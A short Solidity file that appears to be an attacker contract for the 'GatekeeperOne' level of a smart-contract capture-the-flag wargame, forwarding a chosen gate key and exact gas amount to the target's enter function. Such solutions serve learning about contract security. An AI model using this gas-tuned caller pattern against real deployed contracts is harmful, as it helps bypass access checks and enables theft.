pragma solidity ^0.8.0;

interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract GatekeeperOneAttacker {

    function enterGatekeeper(bytes8 _gateKey, address _gatekeeper, uint256 _gasAmount) external {
        IGatekeeperOne(_gatekeeper).enter{gas:_gasAmount}(_gateKey);
    }

}